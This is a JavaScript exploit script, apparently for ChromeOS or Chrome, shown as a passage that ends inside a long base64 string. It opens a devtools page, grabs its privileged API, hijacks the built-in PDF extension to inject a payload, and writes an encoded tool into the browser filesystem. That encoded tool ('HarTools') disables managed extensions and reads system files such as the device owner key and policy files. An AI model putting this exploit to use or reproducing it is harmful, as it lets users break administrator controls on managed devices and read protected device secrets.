((function () {
    if (!opener) {
        opener = window;
    }
    // alert(origin);

    //     window.w = w;
    // })
    const w = window.opener.open("devtools://devtools/bundled/inspector.html");
    window.opener.close();
    w.addEventListener("load", async () => {
        if (!w.DevToolsAPI) {
            console.log("reloading");
            w.opener = null;
            w.location.reload();
        }
        await sleep(500);
        console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
        exploit(w);
    });

    window.w = w;


    function exploit(w) {


        function ui() {
            const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
            var globalUID = 0;
            let globalMap = [];
            function payload_swamp(w, d) {
                const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                console.log('hi');
                if (location.origin.includes("chrome-extension://" + pdfId)) {
                    w.close();
                    chrome.tabs.getCurrent(function (info) {
                        chrome.windows.create({
                            setSelfAsOpener: true,
                            url: mojoURL
                        }, function (win) {
                            const r = win.tabs[0].id;
                            chrome.tabs.executeScript(r, { code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"` });

                        })
                    })


                    return;
                }
                // console.log(d);
                // w.setTimeout(function() {
                const blob_url = new Blob(["alert(1)"], { type: "text/html" });

                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {
                    function removeFile(file) {
                        return new Promise(function (resolve, reject) {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(resolve);
                            })
                        });
                    }
                    function writeFile(file, data) {
                        return new Promise((resolve, reject) => {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(function () {
                                    fs.root.getFile(file, { create: true }, function (entry) {
                                        entry.createWriter(function (writer) {
                                            writer.write(new Blob([data]));
                                            resolve(entry.toURL());
                                        })
                                    })
                                })
                            })
                        })
                    };
                    if (d.cleanup) {
                        console.log("cleaning up");
                        debugger;
                        await removeFile('index.js');
                        await removeFile('index.html');
                        alert("Cleaned up successfully!");
                        cleanup();
                        w.close();
                        return;
                    }
                    await writeFile('index.js', atob(`b25lcnJvciA9IGFsZXJ0OwoKY29uc3QgdWlUZW1wbGF0ZSA9IGAKCmA7CgppZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oInVzZXJkZWZJZHMiKSA9PT0gbnVsbCkKICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJ1c2VyZGVmSWRzIiwgSlNPTi5zdHJpbmdpZnkoW10pKTsKCkFycmF5LnByb3RvdHlwZS5yZW1vdmUgPSBmdW5jdGlvbihpdGVtKSB7CiAgICBpZiAodGhpcy5pbmRleE9mKGl0ZW0pID09PSAtMSkgdGhyb3cgbmV3IEVycm9yKCJub3QgaW4gYXJyYXkiKTsKICAgIHRoaXMuc3BsaWNlKHRoaXMuaW5kZXhPZihpdGVtKSwgMSk7Cn07CgpmdW5jdGlvbiBtYWtlVG9hc3QobXNnLCB0aW1lKSB7CiAgICBjb25zdCBwb3BvdmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYXJ0aWNsZSIpOwogICAgcG9wb3Zlci5wb3BvdmVyID0gIm1hbnVhbCI7CiAgICBwb3BvdmVyLmNsYXNzTGlzdC5hZGQoInRvYXN0Iik7CiAgICBwb3BvdmVyLmNsYXNzTGlzdC5hZGQoIm5ld2VzdCIpOwogICAgcG9wb3Zlci50ZXh0Q29udGVudCA9IG1zZzsKICAgIHBvcG92ZXIuc3R5bGUudHJhbnNsYXRlID0gIi01MCUiOwoKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocG9wb3Zlcik7CiAgICBwb3BvdmVyLnNob3dQb3BvdmVyKCk7CgogICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgcG9wb3Zlci5oaWRlUG9wb3ZlcigpOwogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICBwb3BvdmVyLnJlbW92ZSgpOwogICAgICAgIH0sIDUwMCk7CiAgICB9LCB0aW1lICogMTAwMCk7CgogICAgcG9wb3Zlci5hZGRFdmVudExpc3RlbmVyKCJ0b2dnbGUiLCAoZXZlbnQpID0+IHsKICAgICAgICBpZiAoZXZlbnQubmV3U3RhdGUgPT09ICJvcGVuIikgewogICAgICAgICAgICBtb3ZlVG9hc3RzKCk7CiAgICAgICAgfQogICAgfSk7Cn0KCmZ1bmN0aW9uIG1vdmVUb2FzdHMoKSB7CiAgICBjb25zdCB0b2FzdHMgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCIudG9hc3QiKTsKCiAgICB0b2FzdHMuZm9yRWFjaCgodG9hc3QpID0+IHsKICAgICAgICBpZiAodG9hc3QuY2xhc3NMaXN0LmNvbnRhaW5zKCJuZXdlc3QiKSkgewogICAgICAgICAgICB0b2FzdC5zdHlsZS50b3AgPSBgNXB4YDsKICAgICAgICAgICAgdG9hc3QuY2xhc3NMaXN0LnJlbW92ZSgibmV3ZXN0Iik7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgY29uc3QgcHJldlZhbHVlID0gdG9hc3Quc3R5bGUudG9wLnJlcGxhY2UoInB4IiwgIiIpOwogICAgICAgICAgICBjb25zdCBuZXdWYWx1ZSA9IHBhcnNlSW50KHByZXZWYWx1ZSkgKyB0b2FzdC5jbGllbnRIZWlnaHQgKyAxMDsKICAgICAgICAgICAgdG9hc3Quc3R5bGUudG9wID0gYCR7bmV3VmFsdWV9cHhgOwogICAgICAgIH0KICAgIH0pOwp9CgpmdW5jdGlvbiBtYWtlRGlhbG9nKHRpdGxlLCBtc2csIG9uY2FuY2VsLCBvbmNvbmZpcm0pIHsKICAgIGNvbnN0IGRpYWxvZyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpYWxvZyIpOwogICAgY29uc3QgY29uZmlybUJ0biA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwogICAgY29uc3QgY2FuY2VsQnRuID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CiAgICBjb25zdCBoZWFkID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaDEiKTsKICAgIGNvbnN0IGJvZHkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIGNvbnN0IGZvb3QgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKCiAgICBkaWFsb2cuYXBwZW5kQ2hpbGQoaGVhZCk7CiAgICBkaWFsb2cuYXBwZW5kQ2hpbGQoYm9keSk7CiAgICBkaWFsb2cuYXBwZW5kQ2hpbGQoZm9vdCk7CiAgICBmb290LmFwcGVuZENoaWxkKGNvbmZpcm1CdG4pOwogICAgZm9vdC5hcHBlbmRDaGlsZChjYW5jZWxCdG4pOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChkaWFsb2cpOwoKICAgIGhlYWQudGV4dENvbnRlbnQgPSB0aXRsZTsKCiAgICBib2R5LnN0eWxlLm92ZXJmbG93WSA9ICJzY3JvbGwiOwogICAgYm9keS5zdHlsZS5jb2xvciA9ICJyZ2IoMjIwIDIyMCAyMjApIjsKICAgIGJvZHkuc3R5bGUuZm9udFNpemUgPSAiMXJlbSI7CiAgICBib2R5LnN0eWxlLmJvcmRlclJhZGl1cyA9ICIxMHB4IjsKICAgIGJvZHkuc3R5bGUucGFkZGluZyA9ICIxMHB4IjsKICAgIGJvZHkuc3R5bGUubWFyZ2luQm90dG9tID0gIjEwcHgiOwoKICAgIGlmIChBcnJheS5pc0FycmF5KG1zZykpIHsKICAgICAgICBib2R5LnN0eWxlLmJvcmRlciA9ICJzb2xpZCAxcHggIzFkMWQxZCI7CiAgICAgICAgbXNnLmZvckVhY2goKHZhbHVlKSA9PiB7CiAgICAgICAgICAgIGxldCBpdGVtID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgicCIpOwogICAgICAgICAgICBpdGVtLnRleHRDb250ZW50ID0gdmFsdWU7CiAgICAgICAgICAgIGJvZHkuYXBwZW5kQ2hpbGQoaXRlbSk7CiAgICAgICAgfSk7CiAgICB9IGVsc2UgewogICAgICAgIGJvZHkuc3R5bGUuYm9yZGVyID0gInNvbGlkIDFweCAjMmQyZDJkIjsKICAgICAgICBib2R5LnRleHRDb250ZW50ID0gbXNnOwogICAgfQoKICAgIGZvb3Quc3R5bGUuaGVpZ2h0ID0gImZpdC1jb250ZW50IjsKICAgIGZvb3Quc3R5bGUubWFyZ2luVG9wID0gImF1dG8iOwogICAgZm9vdC5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwogICAgZm9vdC5zdHlsZS5mbGV4RGlyZWN0aW9uID0gInJvdy1yZXZlcnNlIjsKCiAgICBjb25maXJtQnRuLmNsYXNzTGlzdC5hZGQoImNvbmZpcm1CdG4iKTsKICAgIGNvbmZpcm1CdG4uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoKSA9PiB7CiAgICAgICAgZGlhbG9nLmNsb3NlKCk7CiAgICAgICAgb25jb25maXJtKCk7CiAgICAgICAgc2V0VGltZW91dCgoKSA9PiBkaWFsb2cucmVtb3ZlKCksIDEwMDApOwogICAgfSk7CiAgICBjb25maXJtQnRuLnRleHRDb250ZW50ID0gIkNvbmZpcm0iOwoKICAgIGNhbmNlbEJ0bi5jbGFzc0xpc3QuYWRkKCJjYW5jZWxCdG4iKTsKICAgIGNhbmNlbEJ0bi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsICgpID0+IHsKICAgICAgICBkaWFsb2cuY2xvc2UoKTsKICAgICAgICBvbmNhbmNlbCgpOwogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gZGlhbG9nLnJlbW92ZSgpLCAxMDAwKTsKICAgIH0pOwogICAgY2FuY2VsQnRuLnRleHRDb250ZW50ID0gIkNhbmNlbCI7CgogICAgZGlhbG9nLnNob3dNb2RhbCgpOwp9Cgphc3luYyBmdW5jdGlvbiBleHRlbnNpb25FeGlzdHMoaWQpIHsKICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4KICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRBbGwoKGV4dGVuc2lvbnMpID0+CiAgICAgICAgICAgIHJlc29sdmUoZXh0ZW5zaW9ucy5zb21lKChleHQpID0+IGV4dC5pZCA9PT0gaWQpKQogICAgICAgICkKICAgICk7Cn0KCmNvbnN0IG1hbmFnZW1lbnRUZW1wbGF0ZSA9IGAKPHRpdGxlPlVudGl0bGVkIGRvY3VtZW50PC90aXRsZT4KPGxpbmsgcmVsPSJpY29uIiB0eXBlPSJpbWFnZS94LWljb24iIGhyZWY9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jcm9zc2pibHkvSGFyVG9vbHMtcmlndG9vbHMxMjhwbHVzL3JlZnMvaGVhZHMvbWFpbi9kb2NzLmljbyI+CjxkaXYgaWQ9ImNocm9tZV9tYW5hZ2VtZW50X2Rpc2FibGVfZXh0Ij4KICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgogICAgPGltZyBzcmM9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jcm9zc2pibHkvSGFyVG9vbHMtcmlndG9vbHMxMjhwbHVzL3JlZnMvaGVhZHMvbWFpbi9oYXJ0b29scy5naWYiIGFsdD0iSGFyVG9vbHMgTG9nbyIgY2xhc3M9ImxvZ28iIC8+CiAgICA8aDE+IGNocm9tZS5tYW5hZ2VtZW50IERpc2FibGUgRXh0ZW5zaW9ucyA8L2gxPgogIDwvZGl2PgogIDxwIGNsYXNzPSJkZXNjcmlwdGlvbiI+R2l0SHViIHJlcG86IGh0dHBzOi8vZ2l0aHViLmNvbS9jcm9zc2pibHkvSGFyVG9vbHMvIDxicj4gWFNTIGZvdW5kIGJ5IDxhIGhyZWY9Imh0dHBzOi8vY3Jvc3NqYmx5LnBhZ2VzLmRldi8iPmNyb3NzamJseTwvYT4gPGJyPiBVSSBtYWRlIGJ5IDxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9CbG9iYnktQm9pLyI+QmxvYmJ5IEJvaTwvYT48YnI+PC9wPgogIDxwPkV4dGVuc2lvbnM8L3A+CiAgPHdoaXRlYnV0dG9ucz4KICA8YnV0dG9uIGlkPSJjdXJyZW50LWV4dGVuc2lvbiI+RGlzYWJsZSBpbmplY3RlZCBleHRlbnNpb248L2J1dHRvbj4KICA8YnV0dG9uIGlkPSJybXYtY21uLWJsdCI+UmVtb3ZlIEJsb2F0PC9idXR0b24+CiAgPGJ1dHRvbiBpZD0iZGlzYWJsZS11c2VyZGVmLWV4dHMiPkRpc2FibGUgdXNlciBkZWZpbmVkIGxpc3Qgb2YgZXh0ZW5zaW9uczwvYnV0dG9uPgogIDwvd2hpdGVidXR0b25zPgoKICA8YnIgLz48YnIgLz4KICA8dWwgY2xhc3M9ImV4dGxpc3QiPgogIDwvdWw+CgogIDxkaXYgc3R5bGU9ImhlaWdodDogNTBweCI+PC9kaXY+CjwvZGl2PgoKYDsKbGV0IHNhdmVkRXh0TGlzdCA9IFtdOwpjb25zdCBrRmlsZXMgPSBbCiAgICAiL3Zhci9saWIvZGV2aWNlc2V0dGluZ3Mvb3duZXIua2V5IiwKICAgICIvaG9tZS9jaHJvbm9zL0xvY2FsIFN0YXRlIgpdCmFzeW5jIGZ1bmN0aW9uIHJlYWRGaWxlKHBhdGgpIHsKICAgIHJldHVybiAoYXdhaXQgZmV0Y2goImZpbGU6Ly8iICsgcGF0aCkpLmFycmF5QnVmZmVyKCk7Cn0KYXN5bmMgZnVuY3Rpb24gZmluZExhc3RQb2xpY3lGaWxlKCkgewogICAgY29uc3Qga0RldmljZVBvbGljeSA9ICIvdmFyL2xpYi9kZXZpY2VzZXR0aW5ncy9wb2xpY3kuIjsKICAgIGxldCBmb3VuZFNvbWV0aGluZyA9IGZhbHNlOwogICAgbGV0IGkgPSAwOwogICAgd2hpbGUgKHRydWUpIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBjb25zb2xlLmxvZygiVHJ5aW5nICIgKyBrRGV2aWNlUG9saWN5ICsgaSk7CiAgICAgICAgICAgIGF3YWl0IHJlYWRGaWxlKGtEZXZpY2VQb2xpY3kgKyBpKTsKICAgICAgICAgICAgZm91bmRTb21ldGhpbmcgPSB0cnVlOwogICAgICAgIH0gY2F0Y2ggewogICAgICAgICAgICBpZiAoZm91bmRTb21ldGhpbmcpIHsKICAgICAgICAgICAgICAgIHJldHVybiBrRGV2aWNlUG9saWN5ICsgKGkgLSAxKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpKys7CiAgICB9Cn0KCmZ1bmN0aW9uIGRvZXNOZWVkRmlsZUFjY2VzcygpIHsKICAgIGNvbnN0IHNjID0gY2hyb21lLnJ1bnRpbWUuZ2V0TWFuaWZlc3QoKS5wZXJtaXNzaW9uczsKICAgIHJldHVybiBzYy5pbmNsdWRlcygiYWN0aXZlVGFiIikgfHwgc2MuaW5jbHVkZXMoIjxhbGxfdXJscz4iKTsKfQoKZnVuY3Rpb24gbm9ybWFsaXplU3RyaW5nUG9zaXgocGF0aCwgYWxsb3dBYm92ZVJvb3QpIHsKICAgIHZhciByZXMgPSAnJzsKICAgIHZhciBsYXN0U2VnbWVudExlbmd0aCA9IDA7CiAgICB2YXIgbGFzdFNsYXNoID0gLTE7CiAgICB2YXIgZG90cyA9IDA7CiAgICB2YXIgY29kZTsKICAgIGZvciAodmFyIGkgPSAwOyBpIDw9IHBhdGgubGVuZ3RoOyArK2kpIHsKICAgICAgICBpZiAoaSA8IHBhdGgubGVuZ3RoKQogICAgICAgICAgICBjb2RlID0gcGF0aC5jaGFyQ29kZUF0KGkpOwogICAgICAgIGVsc2UgaWYgKGNvZGUgPT09IDQ3KQogICAgICAgICAgICBicmVhazsKICAgICAgICBlbHNlCiAgICAgICAgICAgIGNvZGUgPSA0NzsKICAgICAgICBpZiAoY29kZSA9PT0gNDcpIHsKICAgICAgICAgICAgaWYgKGxhc3RTbGFzaCA9PT0gaSAtIDEgfHwgZG90cyA9PT0gMSkgewoKICAgICAgICAgICAgfSBlbHNlIGlmIChsYXN0U2xhc2ggIT09IGkgLSAxICYmIGRvdHMgPT09IDIpIHsKICAgICAgICAgICAgICAgIGlmIChyZXMubGVuZ3RoIDwgMiB8fCBsYXN0U2VnbWVudExlbmd0aCAhPT0gMiB8fCByZXMuY2hhckNvZGVBdChyZXMubGVuZ3RoIC0gMSkgIT09IDQ2IHx8IHJlcy5jaGFyQ29kZUF0KHJlcy5sZW5ndGggLSAyKSAhPT0gNDYpIHsKICAgICAgICAgICAgICAgICAgICBpZiAocmVzLmxlbmd0aCA+IDIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGxhc3RTbGFzaEluZGV4ID0gcmVzLmxhc3RJbmRleE9mKCcvJyk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChsYXN0U2xhc2hJbmRleCAhPT0gcmVzLmxlbmd0aCAtIDEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChsYXN0U2xhc2hJbmRleCA9PT0gLTEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXMgPSAnJzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsYXN0U2VnbWVudExlbmd0aCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcyA9IHJlcy5zbGljZSgwLCBsYXN0U2xhc2hJbmRleCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGFzdFNlZ21lbnRMZW5ndGggPSByZXMubGVuZ3RoIC0gMSAtIHJlcy5sYXN0SW5kZXhPZignLycpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGFzdFNsYXNoID0gaTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvdHMgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHJlcy5sZW5ndGggPT09IDIgfHwgcmVzLmxlbmd0aCA9PT0gMSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXMgPSAnJzsKICAgICAgICAgICAgICAgICAgICAgICAgbGFzdFNlZ21lbnRMZW5ndGggPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBsYXN0U2xhc2ggPSBpOwogICAgICAgICAgICAgICAgICAgICAgICBkb3RzID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKGFsbG93QWJvdmVSb290KSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHJlcy5sZW5ndGggPiAwKQogICAgICAgICAgICAgICAgICAgICAgICByZXMgKz0gJy8uLic7CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICByZXMgPSAnLi4nOwogICAgICAgICAgICAgICAgICAgIGxhc3RTZWdtZW50TGVuZ3RoID0gMjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmIChyZXMubGVuZ3RoID4gMCkKICAgICAgICAgICAgICAgICAgICByZXMgKz0gJy8nICsgcGF0aC5zbGljZShsYXN0U2xhc2ggKyAxLCBpKTsKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICByZXMgPSBwYXRoLnNsaWNlKGxhc3RTbGFzaCArIDEsIGkpOwogICAgICAgICAgICAgICAgbGFzdFNlZ21lbnRMZW5ndGggPSBpIC0gbGFzdFNsYXNoIC0gMTsKICAgICAgICAgICAgfQogICAgICAgICAgICBsYXN0U2xhc2ggPSBpOwogICAgICAgICAgICBkb3RzID0gMDsKICAgICAgICB9IGVsc2UgaWYgKGNvZGUgPT09IDQ2ICYmIGRvdHMgIT09IC0xKSB7CiAgICAgICAgICAgICsrZG90czsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBkb3RzID0gLTE7CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuIHJlczsKfQoKZnVuY3Rpb24gX2Zvcm1hdChzZXAsIHBhdGhPYmplY3QpIHsKICAgIHZhciBkaXIgPSBwYXRoT2JqZWN0LmRpciB8fCBwYXRoT2JqZWN0LnJvb3Q7CiAgICB2YXIgYmFzZSA9IHBhdGhPYmplY3QuYmFzZSB8fCAocGF0aE9iamVjdC5uYW1lIHx8ICcnKSArIChwYXRoT2JqZWN0LmV4dCB8fCAnJyk7CiAgICBpZiAoIWRpcikgewogICAgICAgIHJldHVybiBiYXNlOwogICAgfQogICAgaWYgKGRpciA9PT0gcGF0aE9iamVjdC5yb290KSB7CiAgICAgICAgcmV0dXJuIGRpciArIGJhc2U7CiAgICB9CiAgICByZXR1cm4gZGlyICsgc2VwICsgYmFzZTsKfQp2YXIgcG9zaXggPSB7CgogICAgcmVzb2x2ZTogZnVuY3Rpb24gcmVzb2x2ZSgpIHsKICAgICAgICB2YXIgcmVzb2x2ZWRQYXRoID0gJyc7CiAgICAgICAgdmFyIHJlc29sdmVkQWJzb2x1dGUgPSBmYWxzZTsKICAgICAgICB2YXIgY3dkOwogICAgICAgIGZvciAodmFyIGkgPSBhcmd1bWVudHMubGVuZ3RoIC0gMTsgaSA+PSAtMSAmJiAhcmVzb2x2ZWRBYnNvbHV0ZTsgaS0tKSB7CiAgICAgICAgICAgIHZhciBwYXRoOwogICAgICAgICAgICBpZiAoaSA+PSAwKQogICAgICAgICAgICAgICAgcGF0aCA9IGFyZ3VtZW50c1tpXTsKICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAoY3dkID09PSB1bmRlZmluZWQpCiAgICAgICAgICAgICAgICAgICAgY3dkID0gcHJvY2Vzcy5jd2QoKTsKICAgICAgICAgICAgICAgIHBhdGggPSBjd2Q7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgYXNzZXJ0UGF0aChwYXRoKTsKCiAgICAgICAgICAgIGlmIChwYXRoLmxlbmd0aCA9PT0gMCkgewogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmVzb2x2ZWRQYXRoID0gcGF0aCArICcvJyArIHJlc29sdmVkUGF0aDsKICAgICAgICAgICAgcmVzb2x2ZWRBYnNvbHV0ZSA9IHBhdGguY2hhckNvZGVBdCgwKSA9PT0gNDc7CiAgICAgICAgfQoKICAgICAgICByZXNvbHZlZFBhdGggPSBub3JtYWxpemVTdHJpbmdQb3NpeChyZXNvbHZlZFBhdGgsICFyZXNvbHZlZEFic29sdXRlKTsKICAgICAgICBpZiAocmVzb2x2ZWRBYnNvbHV0ZSkgewogICAgICAgICAgICBpZiAocmVzb2x2ZWRQYXRoLmxlbmd0aCA+IDApCiAgICAgICAgICAgICAgICByZXR1cm4gJy8nICsgcmVzb2x2ZWRQYXRoOwogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICByZXR1cm4gJy8nOwogICAgICAgIH0gZWxzZSBpZiAocmVzb2x2ZWRQYXRoLmxlbmd0aCA+IDApIHsKICAgICAgICAgICAgcmV0dXJuIHJlc29sdmVkUGF0aDsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXR1cm4gJy4nOwogICAgICAgIH0KICAgIH0sCiAgICBub3JtYWxpemU6IGZ1bmN0aW9uIG5vcm1hbGl6ZShwYXRoKSB7CiAgICAgICAgYXNzZXJ0UGF0aChwYXRoKTsKICAgICAgICBpZiAocGF0aC5sZW5ndGggPT09IDApIHJldHVybiAnLic7CiAgICAgICAgdmFyIGlzQWJzb2x1dGUgPSBwYXRoLmNoYXJDb2RlQXQoMCkgPT09IDQ3OwogICAgICAgIHZhciB0cmFpbGluZ1NlcGFyYXRvciA9IHBhdGguY2hhckNvZGVBdChwYXRoLmxlbmd0aCAtIDEpID09PSA0NzsKCiAgICAgICAgcGF0aCA9IG5vcm1hbGl6ZVN0cmluZ1Bvc2l4KHBhdGgsICFpc0Fic29sdXRlKTsKICAgICAgICBpZiAocGF0aC5sZW5ndGggPT09IDAgJiYgIWlzQWJzb2x1dGUpIHBhdGggPSAnLic7CiAgICAgICAgaWYgKHBhdGgubGVuZ3RoID4gMCAmJiB0cmFpbGluZ1NlcGFyYXRvcikgcGF0aCArPSAnLyc7CiAgICAgICAgaWYgKGlzQWJzb2x1dGUpIHJldHVybiAnLycgKyBwYXRoOwogICAgICAgIHJldHVybiBwYXRoOwogICAgfSwKICAgIGlzQWJzb2x1dGU6IGZ1bmN0aW9uIGlzQWJzb2x1dGUocGF0aCkgewogICAgICAgIGFzc2VydFBhdGgocGF0aCk7CiAgICAgICAgcmV0dXJuIHBhdGgubGVuZ3RoID4gMCAmJiBwYXRoLmNoYXJDb2RlQXQoMCkgPT09IDQ3OwogICAgfSwKICAgIGpvaW46IGZ1bmN0aW9uIGpvaW4oKSB7CiAgICAgICAgaWYgKGFyZ3VtZW50cy5sZW5ndGggPT09IDApCiAgICAgICAgICAgIHJldHVybiAnLic7CiAgICAgICAgdmFyIGpvaW5lZDsKICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGFyZ3VtZW50cy5sZW5ndGg7ICsraSkgewogICAgICAgICAgICB2YXIgYXJnID0gYXJndW1lbnRzW2ldOwogICAgICAgICAgICBhc3NlcnRQYXRoKGFyZyk7CiAgICAgICAgICAgIGlmIChhcmcubGVuZ3RoID4gMCkgewogICAgICAgICAgICAgICAgaWYgKGpvaW5lZCA9PT0gdW5kZWZpbmVkKQogICAgICAgICAgICAgICAgICAgIGpvaW5lZCA9IGFyZzsKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBqb2luZWQgKz0gJy8nICsgYXJnOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmIChqb2luZWQgPT09IHVuZGVmaW5lZCkKICAgICAgICAgICAgcmV0dXJuICcuJzsKICAgICAgICByZXR1cm4gcG9zaXgubm9ybWFsaXplKGpvaW5lZCk7CiAgICB9LAogICAgcmVsYXRpdmU6IGZ1bmN0aW9uIHJlbGF0aXZlKGZyb20sIHRvKSB7CiAgICAgICAgYXNzZXJ0UGF0aChmcm9tKTsKICAgICAgICBhc3NlcnRQYXRoKHRvKTsKICAgICAgICBpZiAoZnJvbSA9PT0gdG8pIHJldHVybiAnJzsKICAgICAgICBmcm9tID0gcG9zaXgucmVzb2x2ZShmcm9tKTsKICAgICAgICB0byA9IHBvc2l4LnJlc29sdmUodG8pOwogICAgICAgIGlmIChmcm9tID09PSB0bykgcmV0dXJuICcnOwoKICAgICAgICB2YXIgZnJvbVN0YXJ0ID0gMTsKICAgICAgICBmb3IgKDsgZnJvbVN0YXJ0IDwgZnJvbS5sZW5ndGg7ICsrZnJvbVN0YXJ0KSB7CiAgICAgICAgICAgIGlmIChmcm9tLmNoYXJDb2RlQXQoZnJvbVN0YXJ0KSAhPT0gNDcpCiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgdmFyIGZyb21FbmQgPSBmcm9tLmxlbmd0aDsKICAgICAgICB2YXIgZnJvbUxlbiA9IGZyb21FbmQgLSBmcm9tU3RhcnQ7CgogICAgICAgIHZhciB0b1N0YXJ0ID0gMTsKICAgICAgICBmb3IgKDsgdG9TdGFydCA8IHRvLmxlbmd0aDsgKyt0b1N0YXJ0KSB7CiAgICAgICAgICAgIGlmICh0by5jaGFyQ29kZUF0KHRvU3RhcnQpICE9PSA0NykKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgICAgICB2YXIgdG9FbmQgPSB0by5sZW5ndGg7CiAgICAgICAgdmFyIHRvTGVuID0gdG9FbmQgLSB0b1N0YXJ0OwoKICAgICAgICB2YXIgbGVuZ3RoID0gZnJvbUxlbiA8IHRvTGVuID8gZnJvbUxlbiA6IHRvTGVuOwogICAgICAgIHZhciBsYXN0Q29tbW9uU2VwID0gLTE7CiAgICAgICAgdmFyIGkgPSAwOwogICAgICAgIGZvciAoOyBpIDw9IGxlbmd0aDsgKytpKSB7CiAgICAgICAgICAgIGlmIChpID09PSBsZW5ndGgpIHsKICAgICAgICAgICAgICAgIGlmICh0b0xlbiA+IGxlbmd0aCkgewogICAgICAgICAgICAgICAgICAgIGlmICh0by5jaGFyQ29kZUF0KHRvU3RhcnQgKyBpKSA9PT0gNDcpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB0by5zbGljZSh0b1N0YXJ0ICsgaSArIDEpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoaSA9PT0gMCkgewoKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRvLnNsaWNlKHRvU3RhcnQgKyBpKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGZyb21MZW4gPiBsZW5ndGgpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoZnJvbS5jaGFyQ29kZUF0KGZyb21TdGFydCArIGkpID09PSA0NykgewoKICAgICAgICAgICAgICAgICAgICAgICAgbGFzdENvbW1vblNlcCA9IGk7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChpID09PSAwKSB7CgogICAgICAgICAgICAgICAgICAgICAgICBsYXN0Q29tbW9uU2V